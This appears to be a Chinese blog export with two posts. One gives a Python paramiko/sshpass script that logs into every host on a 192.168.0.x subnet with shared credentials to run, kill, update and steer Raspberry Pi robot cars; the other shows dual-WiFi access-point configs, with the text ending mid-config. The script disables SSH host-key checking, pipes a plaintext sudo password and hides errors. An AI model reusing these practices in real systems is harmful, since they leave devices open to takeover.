    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="linux批量分发-运行-killcode-python"><a href="#linux批量分发-运行-killcode-python" class="headerlink" title="linux批量分发_运行_killcode(python)"></a>linux批量分发_运行_killcode(python)</h1><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>对每个可以进入linux系统设备，统一用户名和密码。<br>同时对设备进行标号如<br>xxx001-xxx010</p>
<h2 id="paramiko"><a href="#paramiko" class="headerlink" title="paramiko"></a>paramiko</h2><p>ssh是一个协议，OpenSSH是其中一个开源实现，paramiko是Python的一个库，实现了SSHv2协议(底层使用cryptography)。</p>
<p>有了Paramiko以后，我们就可以在Python代码中直接使用SSH协议对远程服务器执行操作，而不是通过ssh命令对远程服务器进行操作。</p>
<p>由于paramiko属于第三方库，所以需要使用如下命令先行安装</p>
<p><code>pip3 install paramiko</code></p>
<p>paramiko包含两个核心组件：SSHClient和SFTPClient。</p>
<p>SSHClient的作用类似于Linux的ssh命令，是对SSH会话的封装，该类封装了传输(Transport)，通道(Channel)及SFTPClient建立的方法(open_sftp)，通常用于执行远程命令。</p>
<p>SFTPClient的作用类似与Linux的sftp命令，是对SFTP客户端的封装，用以实现远程文件操作，如文件上传、下载、修改文件权限等操作。</p>
<h3 id="Paramiko中的几个基础名词："><a href="#Paramiko中的几个基础名词：" class="headerlink" title="Paramiko中的几个基础名词："></a>Paramiko中的几个基础名词：</h3><ol>
<li><p>Channel：是一种类Socket，一种安全的SSH传输通道；</p>
</li>
<li><p>Transport：是一种加密的会话，使用时会同步创建了一个加密的Tunnels(通道)，这个Tunnels叫做Channel；</p>
</li>
<li><p>Session：是client与Server保持连接的对象，用connect()/start_client()/start_server()开始会话。</p>
</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">def ssh2(ip,username,passwd,cmd):
    item &#x3D; &#123;&#125;
    item[&#39;ip&#39;] &#x3D; ip
    try:
        ssh &#x3D; paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip,22,username,passwd,timeout&#x3D;5)
        for m in cmd:
            stdin, stdout, stderr &#x3D; ssh.exec_command(m)
            stdin.write(&quot;Y&quot;)   #简单交互，输入 ‘Y’
            out &#x3D; stdout.readlines()
            #屏幕输出
            for o in out:
                print(o),
                item[&#39;name&#39;] &#x3D; o
        print(&#39;%s\tOK\n&#39;%(ip))
        ipList.append(item)
        ssh.close()
    except :
        # print(&#39;%s\tError\n&#39;%(ip))
        x&#x3D;0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="sshpass"><a href="#sshpass" class="headerlink" title="sshpass"></a>sshpass</h2><ol>
<li>安装sshpass</li>
</ol>
<p><code>sudo apt-get install sshpass</code></p>
<ol>
<li>使用sshpass</li>
</ol>
<p><code>sshpass -p xxxxx</code></p>
<p> 使用该命令可以提前输入密码，不用后续输入密码。</p>
<ol>
<li>通过sshpass即可跳过输入密码环境直接scp</li>
</ol>
<p><code>sshpass -p xxxx scp 源地址 目的地址</code></p>
<h2 id="n个linux同时执行程序"><a href="#n个linux同时执行程序" class="headerlink" title="n个linux同时执行程序"></a>n个linux同时执行程序</h2><p>介绍： 1.python 2.kill all 3.send file 4.add channel 5.move 6.move send</p>
<ol>
<li>自动识别局域网中所有可进入设备</li>
<li>n个设备可以同时运行一个python程序</li>
<li>关闭n个设备中运行的python代码</li>
<li>分发代码</li>
<li>增加信道</li>
<li>移动 其中 <code>carnum and 1.Advance 2.Retreat 3.Left 4.Right and move length</code></li>
</ol>
<p>例：2 1 2 即二号设备向前运行2个单位的距离</p>
<ol>
<li>分发一个文件夹</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">#-*- coding: utf-8 -*-
#!&#x2F;usr&#x2F;bin&#x2F;python
import time
import paramiko
import threading
import os
ipList&#x3D;[]

filename &#x3D; &#39;groupUdp.py&#39;


def ssh2(ip,username,passwd,cmd):
    item &#x3D; &#123;&#125;
    item[&#39;ip&#39;] &#x3D; ip
    try:
        ssh &#x3D; paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip,22,username,passwd,timeout&#x3D;5)
        for m in cmd:
            stdin, stdout, stderr &#x3D; ssh.exec_command(m)
            stdin.write(&quot;Y&quot;)   #简单交互，输入 ‘Y’
            out &#x3D; stdout.readlines()
            #屏幕输出
            for o in out:
                print(o),
                item[&#39;name&#39;] &#x3D; o
        print(&#39;%s\tOK\n&#39;%(ip))
        ipList.append(item)
        ssh.close()
    except :
        # print(&#39;%s\tError\n&#39;%(ip))
        x&#x3D;0


def ssh1(ip,username,passwd,cmd):
    try:
        ssh &#x3D; paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip,22,username,passwd,timeout&#x3D;5)
        print(cmd)
        for m in cmd:
            stdin, stdout, stderr &#x3D; ssh.exec_command(m)
            stdin.write(&quot;Y&quot;)   #简单交互，输入 ‘Y’
            out &#x3D; stdout.readlines()
            #屏幕输出
            for o in out:
                print(o),
        print(&#39;%s\tOK\n&#39;%(ip))
        ssh.close()
    except :
        # print(&#39;%s\tError\n&#39;%(ip))
        print(cmd)
        x&#x3D;0
def command(cmd):
    return os.popen(&#39;echo %s |sudo -S %s&#39; % (&#39;vadmin&#39;,cmd)).readlines()

def scp_all(ip,username,passwd,filename):
    cmd&#x3D;&quot;sshpass -p xxxx scp &quot;+filename+&quot; &quot;+username+&quot;@&quot;+ip+&quot;:&#x2F;home&#x2F;pi&#x2F;WIFI_Cmd&#x2F;&quot;+filename
    print(cmd)
    b &#x3D; os.popen(cmd).readlines()
    time.sleep(0.5)
    print(b)

def scp_file_all(ip,username,passwd,file):
    cmd&#x3D;&quot;sshpass -p xxxx scp -r &quot;+file+&quot; &quot;+username+&quot;@&quot;+ip+&quot;:&#x2F;home&#x2F;pi&#x2F;&quot;
    print(cmd)
    b &#x3D; os.popen(cmd).readlines()
    time.sleep(0.5)
    print(b)

if __name__&#x3D;&#x3D;&#39;__main__&#39;:
    cmd &#x3D; [&#39;cat &#x2F;etc&#x2F;hostname&#39;]#你要执行的命令列表,&#39;cd WIFI_Cmd&#x2F; &amp;&amp; pwd &amp;&amp;&#39;
    username &#x3D; &quot;xxx&quot;  #用户名
    passwd &#x3D; &quot;xxxx&quot;    #密码
    threads &#x3D; []   #多线程
    print( &quot;Begin......&quot;)
    for i in range(1,254):
        ip &#x3D; &#39;192.168.0.&#39;+str(i)
        a&#x3D;threading.Thread(target&#x3D;ssh2,args&#x3D;(ip,username,passwd,cmd))
        a.start()
    time.sleep(5)
    while True:
        print(ipList)
        idx_cmd&#x3D;int(input(&quot;1.python 2.kill all 3.send file 4.add channel 5.move 6.move send\n&quot;))
        print(len(ipList))
        if idx_cmd&#x3D;&#x3D;1:
            for idx in range(len(ipList)):

                ip&#x3D;ipList[idx][&#39;ip&#39;]
                name&#x3D;ipList[idx][&#39;name&#39;]
                num&#x3D;int(ipList[idx][&#39;name&#39;][3:6])-1
                print(num)
                cmd &#x3D; [&#39;cd WIFI_Cmd&#x2F; &amp;&amp;  pwd &amp;&amp; sudo nohup python &#39;+filename+&quot; &quot;+str(num) +&#39; &amp;&#39;,&#39;pwd&#39;]
                a&#x3D;threading.Thread(target&#x3D;ssh1,args&#x3D;(ip,username,passwd,cmd))
                a.start()

        elif idx_cmd &#x3D;&#x3D; 2:

            ######kill#####
            for idx in range(len(ipList)):
                ip&#x3D;ipList[idx][&#39;ip&#39;]
                name&#x3D;ipList[idx][&#39;name&#39;]
                cmd &#x3D; [&#39;sudo pkill python&#39;]
                a&#x3D;threading.Thread(target&#x3D;ssh1,args&#x3D;(ip,username,passwd,cmd))
                a.start()
        elif idx_cmd &#x3D;&#x3D; 3:
            ###############分发
            for idx in range(len(ipList)):
                # filename &#x3D; &#39;changeChannel.py&#39;
                ip&#x3D;ipList[idx][&#39;ip&#39;]
                name&#x3D;ipList[idx][&#39;name&#39;]
                a&#x3D;threading.Thread(target&#x3D;scp_all,args&#x3D;(ip,username,passwd,filename))
                a.start()
            ##add channel ssd
        elif idx_cmd &#x3D;&#x3D; 4:
            for idx in range(len(ipList)):
                SSIDNAME&#x3D;&#39;xxx&#39;
                SSIDPASSWORD&#x3D;&#39;xxxx&#39;
                ip&#x3D;ipList[idx][&#39;ip&#39;]
                name&#x3D;ipList[idx][&#39;name&#39;]
                cmd &#x3D; [&#39;cd WIFI_Cmd&#x2F;conf&#x2F; &amp;&amp;wpa_passphrase&#39; +&#39; &quot;&#39;+ SSIDNAME + &#39;&quot; &quot;&#39; + SSIDPASSWORD+&#39;&quot; &gt; &#39;+SSIDNAME+&#39;.conf &amp;&amp; cat &#39;+SSIDNAME+&#39;.conf&#39;]
                a&#x3D;threading.Thread(target&#x3D;ssh1,args&#x3D;(ip,username,passwd,cmd))
                a.start()
            ###move
        elif idx_cmd &#x3D;&#x3D; 5:
            num_car, idx_cmd2,length &#x3D; input(&quot;carnum and 1.Advance 2.Retreat 3.Left 4.Right and move length\n&quot;).split()
            num_car&#x3D;int(num_car)
            idx_cmd2&#x3D;int(idx_cmd2)
            if idx_cmd2 &#x3D;&#x3D; 1:
                cmd &#x3D; [&#39;cd moveUGV&#x2F; &amp;&amp;  pwd &amp;&amp; sudo nohup python Advance.py &amp;&#39;]
            elif idx_cmd2 &#x3D;&#x3D; 2:
                cmd &#x3D; [&#39;cd moveUGV&#x2F; &amp;&amp;  pwd &amp;&amp; sudo nohup python Retreat.py &amp;&#39;]
            elif idx_cmd2 &#x3D;&#x3D; 3:
                cmd &#x3D; [&#39;cd moveUGV&#x2F; &amp;&amp;  pwd &amp;&amp; sudo nohup python Left.py &amp;&#39;]
            elif idx_cmd2 &#x3D;&#x3D; 4:
                cmd &#x3D; [&#39;cd moveUGV&#x2F; &amp;&amp;  pwd &amp;&amp; sudo nohup python right.py &amp;&#39;]
            else:
                cmd &#x3D; [&#39;pwd&#39;]
            for idx in range(len(ipList)):
                ip &#x3D; ipList[idx][&#39;ip&#39;]
                name &#x3D; ipList[idx][&#39;name&#39;]
                num1 &#x3D; int(ipList[idx][&#39;name&#39;][3:6])
                if num_car&#x3D;&#x3D;num1:
                    for i in range(int(length)):
                        a &#x3D; threading.Thread(target&#x3D;ssh1, args&#x3D;(ip, username, passwd, cmd))
                        a.start()
                        time.sleep(3)
            ###move send
        elif idx_cmd &#x3D;&#x3D; 6:
            for idx in range(len(ipList)):
                # filename &#x3D; &#39;changeChannel.py&#39;
                ip&#x3D;ipList[idx][&#39;ip&#39;]
                name&#x3D;ipList[idx][&#39;name&#39;]
                file&#x3D;&#39;moveUGV&#39;
                a&#x3D;threading.Thread(target&#x3D;scp_file_all,args&#x3D;(ip,username,passwd,file))
                a.start()
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>paramiko</tag>
      </tags>
  </entry>
  <entry>
    <title>树莓派系统双网卡</title>
    <url>/2021/04/30/linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8F%8C%E7%BD%91%E5%8D%A1%E5%88%B6%E4%BD%9C/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="抗干扰树莓派操作系统双网卡"><a href="#抗干扰树莓派操作系统双网卡" class="headerlink" title="抗干扰树莓派操作系统双网卡"></a>抗干扰树莓派操作系统双网卡</h1><h2 id="本文主要是讲解如何让一个设备具有两条独立的信道"><a href="#本文主要是讲解如何让一个设备具有两条独立的信道" class="headerlink" title="本文主要是讲解如何让一个设备具有两条独立的信道"></a>本文主要是讲解如何让一个设备具有两条独立的信道</h2><p>首先是我在解决问题中所写的一些东西，就随手的一个笔记。<br><pre class="line-numbers language-none"><code class="language-none">auto lo
iface lo inet loopback

iface eth0 inet manual


auto wlan0
iface wlan0 inet static 
address 192.168.201.165
netmask 255.255.255.0
gateway 192.168.201.1
pre-up wpa_supplicant -Dwext -i wlan0 -c&#x2F;etc&#x2F;wpa_supplicant&#x2F;wpa_supplicant2.conf -B

allow-hotplug wlan0
iface wlan0 inet manual
    wpa-conf &#x2F;etc&#x2F;wpa_supplicant&#x2F;wpa_supplicant2.conf

auto wlan1
iface wlan1 inet static 
address 192.168.201.165
netmask 255.255.255.0
gateway 192.168.201.1
pre-up wpa_supplicant -Dwext -i wlan1 -c&#x2F;etc&#x2F;wpa_supplicant&#x2F;wpa_supplicant.conf -B

allow-hotplug wlan1
iface wlan1 inet manual
    wpa-conf &#x2F;etc&#x2F;wpa_supplicant&#x2F;wpa_supplicant.conf
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><pre class="line-numbers language-none"><code class="language-none">
sudo create_ap -n wlan0 car_wifi 12345678 -c 1




ctrl_interface&#x3D;DIR&#x3D;&#x2F;var&#x2F;run&#x2F;wpa_supplicant GROUP&#x3D;netdev
update_config&#x3D;1
country&#x3D;CN

network&#x3D;&#123;
        ssid&#x3D;&quot;xxx&quot;
        psk&#x3D;&quot;xxx&quot;
        key_mgmt&#x3D;WPA-PSK
&#125;




 sudo nano &#x2F;media&#x2F;pi&#x2F;rootfs&#x2F;etc&#x2F;network&#x2F;interfaces
 sudo nano &#x2F;etc&#x2F;network&#x2F;interfaces
 cd &#x2F;media&#x2F;pi&#x2F;rootfs&#x2F;etc&#x2F;wpa_supplicant&#x2F;


sudo nano &#x2F;media&#x2F;pi&#x2F;rootfs&#x2F;etc&#x2F;dhcpcd.conf
sudo nano &#x2F;etc&#x2F;dhcpcd.conf


<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h2 id="安装一些库"><a href="#安装一些库" class="headerlink" title="安装一些库"></a>安装一些库</h2><pre class="line-numbers language-none"><code class="language-none">sudo apt-get install util-linux procps hostapd iproute2 iw haveged dnsmasq<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="安装开源软件"><a href="#安装开源软件" class="headerlink" title="安装开源软件"></a>安装开源软件</h3><pre class="line-numbers language-none"><code class="language-none">sudo git clone https:&#x2F;&#x2F;github.com&#x2F;oblique&#x2F;create_ap
cd create_ap
sudo make install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h2 id="设置开机启动项"><a href="#设置开机启动项" class="headerlink" title="设置开机启动项"></a>设置开机启动项</h2><pre class="line-numbers language-none"><code class="language-none">cd .config&#x2F;
mkdir autostart
cd autostart&#x2F;
sudo nano local.desktop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">[Desktop Entry]
Type&#x3D;Application
Exec&#x3D;sudo sh run.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><code>sudo nano run.sh</code></p>
<pre class="line-numbers language-none"><code class="language-none">sudo service hostapd stop
sudo service dnsmasq stop


sudo ifup wlan1
sudo ifup wlan0
sudo ifdown wlan0
sudo create_ap -n wlan0 carwifi 12345678 -c 1
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="本人一些配置文件修改"><a href="#本人一些配置文件修改" class="headerlink" title="本人一些配置文件修改"></a>本人一些配置文件修改</h2><h3 id="配置interfaces"><a href="#配置interfaces" class="headerlink" title="配置interfaces"></a>配置interfaces</h3><p><code>sudo vim /etc/network/interfaces</code></p>
<pre class="line-numbers language-none"><code class="language-none">#root@raspberrypi:&#x2F;etc&#x2F;network# cat interfaces
# interfaces(5) file used by ifup(8) and ifdown(8)
# Please note that this file is written to be used with dhcpcd
# For static IP, consult &#x2F;etc&#x2F;dhcpcd.conf and &#39;man dhcpcd.conf&#39;

# Include files from &#x2F;etc&#x2F;network&#x2F;interfaces.d:
source-directory &#x2F;etc&#x2F;network&#x2F;interfaces.d

#auto lo
#iface lo inet loopback

#inface enth0 inet manual
#auto wlan0
#iface wlan0 inet dhcp
#iface wlan0 inet dhcp
#wpa-conf &#x2F;etc&#x2F;wpa_supplicant&#x2F;wpa_supplicant.conf
auto eth0
iface eth0 inet manual

#auto wlan0
#allow-hotplug wlan0
iface wlan0 inet manual

#iface wlan0 inet dhcp
wpa-conf &#x2F;etc&#x2F;wpa_supplicant&#x2F;wpa_supplicant.conf


#auto wlan0
#iface wlan0 inet static
#address 192.168.201.165
#netmask 255.255.255.0
#gateway 192.168.201.1
#pre-up wpa_supplicant -Dwext -i wlan0 -c&#x2F;etc&#x2F;wpa_supplicant&#x2F;wpa_supplicant.conf -B

#allow-hotplug wlan0
#wpa-conf &#x2F;etc&#x2F;wpa_supplicant&#x2F;wpa_supplicant.conf


iface wlan1 inet dhcp
wpa-conf &#x2F;etc&#x2F;wpa_supplicant&#x2F;wpa_supplicant.conf
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="配置hostapd"><a href="#配置hostapd" class="headerlink" title="配置hostapd"></a>配置hostapd</h3><pre class="line-numbers language-none"><code class="language-none">interface&#x3D;wlan0
driver&#x3D;nl80211
ssid&#x3D;pi3
hw_mode&#x3D;g
channel&#x3D;6
ieee80211n&#x3D;1
wmm_enabled&#x3D;1
ht_capab&#x3D;[HT40][SHORT-GT-20][DSSS_CCK-40]
macaddr_acl&#x3D;0
auth_algs&#x3D;1
ignore_broadcast_ssid&#x3D;0
wpa&#x3D;2
wpa_key_mgmt&#x3D;WPA-PSK
wpa_passphrase&#x3D;12345678
rsn_pairwise&#x3D;CCMP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="配置dhcp"><a href="#配置dhcp" class="headerlink" title="配置dhcp"></a>配置dhcp</h3><p><code>sudo nano /etc/dhcpcd.conf</code></p>
<pre class="line-numbers language-none"><code class="language-none">
# A sample configuration for dhcpcd.
# See dhcpcd.conf(5) for details.

# Allow users of this group to interact with dhcpcd via the control socket.
#controlgroup wheel

# Inform the DHCP server of our hostname for DDNS.
hostname

# Use the hardware address of the interface for the Client ID.
clientid
# or
# Use the same DUID + IAID as set in DHCPv6 for DHCPv4 ClientID as per RFC4361.
#duid

# Persist interface configuration when dhcpcd exits.
persistent

# Rapid commit support.
# Safe to enable by default because it requires the equivalent option set
# on the server to actually work.
option rapid_commit

# A list of options to request from the DHCP server.
option domain_name_servers, domain_name, domain_search, host_name
option classless_static_routes
# Most distributions have NTP support.
option ntp_servers
# Respect the network MTU.
# Some interface drivers reset when changing the MTU so disabled by default.
#option interface_mtu

# A ServerID is required by RFC2131.
require dhcp_server_identifier

# Generate Stable Private IPv6 Addresses instead of hardware based ones
slaac private

# A hook script is provided to lookup the hostname if not set by the DHCP
# server, but it should not be run by default.
nohook lookup-hostname

interface eth0
static ip_address&#x3D;192.168.3.233&#x2F;24
static routers&#x3D;192.168.3.1
static domain_name_servers&#x3D;114.114.114.114

interface wlan0
#static ip_address&#x3D;172.16.233.233&#x2F;16
#static routers&#x3D;172.16.0.1
static domain_name_servers&#x3D;114.114.114.114

static ip_address&#x3D;10.42.0.233&#x2F;24
static routers&#x3D;10.42.0.1



<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="配置dnsmaq"><a href="#配置dnsmaq" class="headerlink" title="配置dnsmaq"></a>配置dnsmaq</h3><p><code>sudo vim /etc/dhcpcd.conf</code></p>
<pre class="line-numbers language-none"><code class="language-none"># Configuration file for dnsmasq.
#
# Format is one option per line, legal options are the same
# as the long options legal on the command line. See
# &quot;&#x2F;usr&#x2F;sbin&#x2F;dnsmasq --help&quot; or &quot;man 8 dnsmasq&quot; for details.

# Listen on this specific port instead of the standard DNS port
# (53). Setting this to zero completely disables DNS function,
# leaving only DHCP and&#x2F;or TFTP.
#port&#x3D;5353

# The following two options make you a better netizen, since they
# tell dnsmasq to filter out queries which the public DNS cannot
# answer, and which load the servers (especially the root servers)
# unnecessarily. If you have a dial-on-demand link they also stop
# these requests from bringing up the link unnecessarily.

# Never forward plain names (without a dot or domain part)
#domain-needed
# Never forward addresses in the non-routed address spaces.
#bogus-priv

# Uncomment these to enable DNSSEC validation and caching:
# (Requires dnsmasq to be built with DNSSEC option.)
#conf-file&#x3D;%%PREFIX%%&#x2F;share&#x2F;dnsmasq&#x2F;trust-anchors.conf
#dnssec

# Replies which are not DNSSEC signed may be legitimate, because the domain
# is unsigned, or may be forgeries. Setting this option tells dnsmasq to
# check that an unsigned reply is OK, by finding a secure proof that a DS 
# record somewhere between the root and the domain does not exist. 
# The cost of setting this is that even queries in unsigned domains will need
# one or more extra DNS queries to verify.
#dnssec-check-unsigned

# Uncomment this to filter useless windows-originated DNS requests
# which can trigger dial-on-demand links needlessly.
# Note that (amongst other things) this blocks all SRV requests,
# so don&#39;t use it if you use eg Kerberos, SIP, XMMP or Google-talk.
# This option only affects forwarding, SRV records originating for
# dnsmasq (via srv-host&#x3D; lines) are not suppressed by it.
#filterwin2k

# Change this line if you want dns to get its upstream servers from
# somewhere other that &#x2F;etc&#x2F;resolv.conf
#resolv-file&#x3D;

# By  default,  dnsmasq  will  send queries to any of the upstream
# servers it knows about and tries to favour servers to are  known
# to  be  up.  Uncommenting this forces dnsmasq to try each query
# with  each  server  strictly  in  the  order  they   appear   in
# &#x2F;etc&#x2F;resolv.conf
#strict-order

# If you don&#39;t want dnsmasq to read &#x2F;etc&#x2F;resolv.conf or any other
# file, getting its servers from this file instead (see below), then
# uncomment this.
#no-resolv

# If you don&#39;t want dnsmasq to poll &#x2F;etc&#x2F;resolv.conf or other resolv
# files for changes and re-read them then uncomment this.
#no-poll

# Add other name servers here, with domain specs if they are for
# non-public domains.
#server&#x3D;&#x2F;localnet&#x2F;192.168.0.1

# Example of routing PTR queries to nameservers: this will send all
# address-&gt;name queries for 192.168.3&#x2F;24 to nameserver 10.1.2.3
#server&#x3D;&#x2F;3.168.192.in-addr.arpa&#x2F;10.1.2.3

# Add local-only domains here, queries in these domains are answered
# from &#x2F;etc&#x2F;hosts or DHCP only.
#local&#x3D;&#x2F;localnet&#x2F;

# Add domains which you want to force to an IP address here.
# The example below send any host in double-click.net to a local
# web-server.
#address&#x3D;&#x2F;double-click.net&#x2F;127.0.0.1

# --address (and --server) work with IPv6 addresses too.
#address&#x3D;&#x2F;www.thekelleys.org.uk&#x2F;fe80::20d:60ff:fe36:f83

# Add the IPs of all queries to yahoo.com, google.com, and their
# subdomains to the vpn and search ipsets:
#ipset&#x3D;&#x2F;yahoo.com&#x2F;google.com&#x2F;vpn,search

# You can control how dnsmasq talks to a server: this forces
# queries to 10.1.2.3 to be routed via eth1
# server&#x3D;10.1.2.3@eth1

# and this sets the source (ie local) address used to talk to
# 10.1.2.3 to 192.168.1.1 port 55 (there must be an interface with that
# IP on the machine, obviously).
# server&#x3D;10.1.2.3@192.168.1.1#55

# If you want dnsmasq to change uid and gid to something other
# than the default, edit the following lines.
#user&#x3D;
#group&#x3D;

# If you want dnsmasq to listen for DHCP and DNS requests only on
# specified interfaces (and the loopback) give the name of the
# interface (eg eth0) here.
# Repeat the line for more than one interface.
#interface&#x3D;
# Or you can specify which interface _not_ to listen on
#except-interface&#x3D;
# Or which to listen on by address (remember to include 127.0.0.1 if
# you use this.)
#listen-address&#x3D;
# If you want dnsmasq to provide only DNS service on an interface,
# configure it as shown above, and then use the following line to
# disable DHCP and TFTP on it.
#no-dhcp-interface&#x3D;

# On systems which support it, dnsmasq binds the wildcard address,
# even when it is listening on only some interfaces. It then discards
# requests that it shouldn&#39;t reply to. This has the advantage of
# working even when interfaces come and go and change address. If you
# want dnsmasq to really bind only the interfaces it is listening on,
# uncomment this option. About the only time you may need this is when
# running another nameserver on the same machine.
#bind-interfaces

# If you don&#39;t want dnsmasq to read &#x2F;etc&#x2F;hosts, uncomment the
# following line.
#no-hosts
# or if you want it to read another file, as well as &#x2F;etc&#x2F;hosts, use
# this.
#addn-hosts&#x3D;&#x2F;etc&#x2F;banner_add_hosts

# Set this (and domain: see below) if you want to have a domain
# automatically added to simple names in a hosts-file.
#expand-hosts

# Set the domain for dnsmasq. this is optional, but if it is set, it
# does the following things.
# 1) Allows DHCP hosts to have fully qualified domain names, as long
#     as the domain part matches this setting.
# 2) Sets the &quot;domain&quot; DHCP option thereby potentially setting the
#    domain of all systems configured by DHCP
# 3) Provides the domain part for &quot;expand-hosts&quot;
#domain&#x3D;thekelleys.org.uk

# Set a different domain for a particular subnet
#domain&#x3D;wireless.thekelleys.org.uk,192.168.2.0&#x2F;24

# Same idea, but range rather then subnet
#domain&#x3D;reserved.thekelleys.org.uk,192.68.3.100,192.168.3.200

# Uncomment this to enable the integrated DHCP server, you need
# to supply the range of addresses available for lease and optionally
# a lease time. If you have more than one network, you will need to
# repeat this for each network on which you want to supply DHCP
# service.
#dhcp-range&#x3D;192.168.0.50,192.168.0.150,12h

# This is an example of a DHCP range where the netmask is given. This
# is needed for networks we reach the dnsmasq DHCP server via a relay
# agent. If you don&#39;t know what a DHCP relay agent is, you probably
# don&#39;t need to worry about this.
#dhcp-range&#x3D;192.168.0.50,192.168.0.150,255.255.255.0,12h

# This is an example of a DHCP range which sets a tag, so that
# some DHCP options may be set only for this network.
#dhcp-range&#x3D;set:red,192.168.0.50,192.168.0.150

# Use this DHCP range only when the tag &quot;green&quot; is set.
#dhcp-range&#x3D;tag:green,192.168.0.50,192.168.0.150,12h

# Specify a subnet which can&#39;t be used for dynamic address allocation,
# is available for hosts with matching --dhcp-host lines. Note that
# dhcp-host declarations will be ignored unless there is a dhcp-range
# of some type for the subnet in question.
# In this case the netmask is implied (it comes from the network
# configuration on the machine running dnsmasq) it is possible to give
# an explicit netmask instead.
#dhcp-range&#x3D;192.168.0.0,static

# Enable DHCPv6. Note that the prefix-length does not need to be specified
# and defaults to 64 if missing&#x2F;
#dhcp-range&#x3D;1234::2, 1234::500, 64, 12h

# Do Router Advertisements, BUT NOT DHCP for this subnet.
#dhcp-range&#x3D;1234::, ra-only 

# Do Router Advertisements, BUT NOT DHCP for this subnet, also try and
# add names to the DNS for the IPv6 address of SLAAC-configured dual-stack 
# hosts. Use the DHCPv4 lease to derive the name, network segment and 
# MAC address and assume that the host will also have an
# IPv6 address calculated using the SLAAC algorithm.
#dhcp-range&#x3D;1234::, ra-names

# Do Router Advertisements, BUT NOT DHCP for this subnet.
# Set the lifetime to 46 hours. (Note: minimum lifetime is 2 hours.)
#dhcp-range&#x3D;1234::, ra-only, 48h

# Do DHCP and Router Advertisements for this subnet. Set the A bit in the RA
# so that clients can use SLAAC addresses as well as DHCP ones.
#dhcp-range&#x3D;1234::2, 1234::500, slaac

# Do Router Advertisements and stateless DHCP for this subnet. Clients will
# not get addresses from DHCP, but they will get other configuration information.
